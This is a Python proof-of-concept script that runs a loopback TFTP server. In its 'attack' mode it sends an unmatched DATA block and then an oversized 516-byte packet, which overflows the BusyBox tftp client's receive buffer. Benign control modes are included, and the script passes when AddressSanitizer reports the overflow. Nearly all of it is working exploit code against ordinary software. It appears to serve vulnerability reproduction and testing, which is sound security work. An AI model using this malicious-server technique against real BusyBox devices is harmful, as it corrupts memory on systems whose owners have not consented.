#!/usr/bin/env python3
"""Loopback-only TFTP server that ignores a small blksize request.

Modes:
  attack : reply with a short unmatched DATA block (forces BusyBox's
           fallback to 512 without reallocating rbuf), then send a full
           516-byte DATA packet.
  oack   : acknowledge the requested blksize -> safe control.
  default: send the full DATA directly to a client that never requested a
           small blksize -> safe control.
"""
import os
import socket
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))


def run_case(binary, mode, blksize, env_extra=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))
    sock.settimeout(6)
    port = sock.getsockname()[1]
    local_file = os.path.join(HERE, "out-%s-%s.bin" % (os.path.basename(binary), mode))
    cmd = [binary, "tftp", "-g"]
    if blksize is not None:
        cmd += ["-b", str(blksize)]
    cmd += ["-l", local_file, "-r", "MISHE", "127.0.0.1", str(port)]
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0:halt_on_error=0"
    if env_extra:
        env.update(env_extra)
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            env=env, cwd=HERE)
    req, peer = sock.recvfrom(2048)
    print("REQ %d bytes: %r" % (len(req), req))
    payload = bytes(((i * 7 + 0x41) & 0xFF) for i in range(512))
    data1 = struct.pack("!HH", 3, 1) + payload
    if mode == "attack":
        # DATA block 0 is not the block the client expects (1), so the
        # client falls back to 512 and re-enters its receive loop with
        # io_bufsize=516 but the original (blksize+4)-byte rbuf.
        sock.sendto(struct.pack("!HH", 3, 0), peer)
        time.sleep(0.15)
        sock.sendto(data1, peer)
    elif mode == "oack":
        sock.sendto(struct.pack("!HH", 6, 0) + b"blksize\0" + str(blksize).encode() + b"\0", peer)
        time.sleep(0.15)
        sock.sendto(data1[:4 + blksize], peer)
    elif mode == "default":
        time.sleep(0.05)
        sock.sendto(data1, peer)
    else:
        raise ValueError(mode)
    try:
        while True:
            reply, _ = sock.recvfrom(2048)
            if (mode != "attack" and len(reply) >= 4
                    and struct.unpack("!HH", reply[:4]) == (4, 1)):
                # final short block: makes the client finish with rc 0
                sock.sendto(struct.pack("!HH", 3, 2), peer)
                break
    except socket.timeout:
        pass
    out, err = proc.communicate(timeout=10)
    sock.close()
    print("RC", proc.returncode)
    print("STDOUT", out.decode("utf-8", "replace")[:400])
    print("STDERR", err.decode("utf-8", "replace")[:3000])
    return proc.returncode, err.decode("utf-8", "replace")


if __name__ == "__main__":
    binary = os.path.abspath(sys.argv[1])
    mode = sys.argv[2]
    blksize = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] != "-" else None
    rc, err = run_case(binary, mode, blksize)
    sys.exit(0 if ("ERROR: AddressSanitizer" in err) == (mode == "attack") else 1)
